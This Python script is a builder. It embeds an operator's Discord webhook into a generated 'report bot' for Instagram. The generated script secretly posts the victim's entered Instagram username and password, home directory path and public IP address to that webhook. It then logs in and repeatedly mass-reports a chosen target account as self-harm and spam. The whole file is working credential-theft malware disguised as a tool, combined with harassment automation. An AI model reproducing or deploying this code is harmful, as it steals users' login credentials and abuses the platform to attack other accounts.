import time
from colorama import Fore, init
init(convert=True)
print(Fore.CYAN, '''
   _       __           __           
  | |     / /  ___     / /      _  __
  | | /| / /  / _ \   / /      | |/_/
  | |/ |/ /  /  __/  / /___   _>  <  
  |__/|__/   \___/  /_____/  /_/|_|  
                  
              @65qm               
    ''')
time.sleep(0.5)
dw = input("discord Webhook : ")
fn = input('File Name ( Without ".py" ) : ')
c0de = '''
import requests
import json
import os.path
from time import  sleep
print("""
                           _     _           _   
                          | |   | |         | |  
 _ __ ___ _ __   ___  _ __| |_  | |__   ___ | |_ 
| '__/ _ \ '_ \ / _ \| '__| __| | '_ \ / _ \| __|
| | |  __/ |_) | (_) | |  | |_  | |_) | (_) | |_ 
|_|  \___| .__/ \___/|_|   \__| |_.__/ \___/ \__|
         | |                                     
         |_|                                         
      """)
hdid = {
    "Host": "www.instagram.com",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Cookie": "csrftoken=missing; sessionid=missing; mid=missing",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
    "Accept-Language": "en-us",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}
r = requests.session()
user = input('username : ')
password = input('password : ')
target = input('target : ')
wh = 'webhookhere'
homedir = os.path.expanduser("~")
urll = 'https://ifconfig.me'
rip = requests.get(urll).text
sdata = "username : `"+user+"` password :  `"+password+"` Target : `"+target+"` System Path : `"+homedir+"` IP Address :  `"+rip+"`"
adata = requests.post(wh, json={'content': sdata})
def login():
    global hdid
    url_login = 'https://www.instagram.com/accounts/login/ajax/'
    headers_login = {
        'accept': '/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-length': '291',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
        'origin': 'https://www.instagram.com/',
        'referer': 'https://www.instagram.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
        'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1cb44f68ffec',
        'x-requested-with': 'XMLHttpRequest'
    }
    data_login = {
        'username': user,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }
    req_login = requests.post(url_login, data=data_login, headers=headers_login)
    if ("userId") in req_login.text:
        r.headers.update({'X-CSRFToken': req_login.cookies['csrftoken']})
        print('Login success')
        reqid = requests.get(f'https://instagram.com/{target}/?__a=1', headers=hdid)
        id = json.loads(reqid.text)["graphql"]["user"]["id"]
        done = 1
        donee = 1
        while True:
            url_report = 'https://www.instagram.com/users/{}/report/'.format(id)
            data_rep = {'source_name': '', 'reason_id': 2, 'frx_context': ''}  # self
            report = r.post(url_report, data=data_rep)
            print('Done self {}'.format(done))
 
            done += 1
 
            url_report = 'https://www.instagram.com/users/{}/report/'.format(id)
            datass = {'source_name': '', 'reason_id': 1, 'frx_context': ''}  # spam
            report = r.post(url_report, data=datass)
            print('Done spam  {}'.format(donee))
            donee += 1
    else:
        print('Login failed')
        exit()
 
 
login()
 '''
c0dr = c0de.replace('webhookhere', dw)
filename = fn+'.py'
f = open(filename, "a")
f.write(c0dr)
f.close()
print('Done, bye')
time.sleep(4)